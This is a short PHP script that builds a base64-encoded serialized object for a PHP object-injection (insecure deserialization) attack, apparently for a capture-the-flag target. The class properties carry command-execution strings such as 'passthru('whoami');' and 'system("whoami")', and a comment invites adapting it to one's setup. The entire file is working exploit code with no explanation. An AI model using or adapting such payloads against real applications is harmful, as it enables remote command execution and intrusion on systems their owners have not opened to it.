<?php
class Stonks
{
    // CHANGE URL/FILENAME TO MATCH YOUR SETUP
	public $ticker = "passthru('whoami');";
	public $value = 99999999;
	public $name = "system()";
    public $shares = 'system("whoami")';
}

echo base64_encode(serialize(new Stonks));